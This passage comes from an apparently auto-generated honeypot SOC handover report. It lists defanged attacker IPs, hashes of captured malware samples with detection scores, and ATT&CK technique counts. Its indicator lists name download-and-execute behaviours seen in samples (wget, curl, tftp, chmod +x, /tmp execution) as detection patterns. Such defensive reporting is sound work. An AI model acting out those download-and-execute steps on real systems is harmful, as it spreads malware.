| `66.132.172[.]101` | 1 | 2026-08-26 15:55 | 2026-08-26 15:55 | 15s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]21` | 1 | 2026-08-26 17:29 | 2026-08-26 17:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]8` | 1 | 2026-08-26 16:24 | 2026-08-26 16:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.239.104[.]160` | 1 | 2026-08-26 15:00 | 2026-08-26 15:00 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `31.41.94[.]249` | UA | New Information Systems PP | **100** ⚠️ | 2 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `201.187.69[.]3` | CL | Telefonica del Sur S.A. | **100** ⚠️ | 3 |
| `200.59.88[.]100` | AR | Sinectis S.A. | **100** ⚠️ | 1 |
| `62.210.198[.]27` | FR | Scaleway Dedibox | **100** ⚠️ | 35 |
| `102.37.220[.]188` | ZA | Microsoft (S.A.) (Proprietary) Limited | **100** ⚠️ | 19 |
| `91.100.95[.]30` | DK | DKTV A/S | **100** ⚠️ | 2 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `193.24.126[.]143` | GE | Netcom LLC | **100** ⚠️ | 2 |
| `62.60.130[.]253` | GB | CIPHER OPERATIONS DOO BEOGRAD - NOVI BEOGRAD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 90 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 65 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 40 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 38 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 38 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 167 cases |
| Tool 34  | Credential Extractor        | ✅ 75 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 73 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (15.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 51 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 19 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 64 priority case(s) shown individually · 39 recon entry/entries in table (12 group(s) consolidating 51 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-26T19:54:30Z_
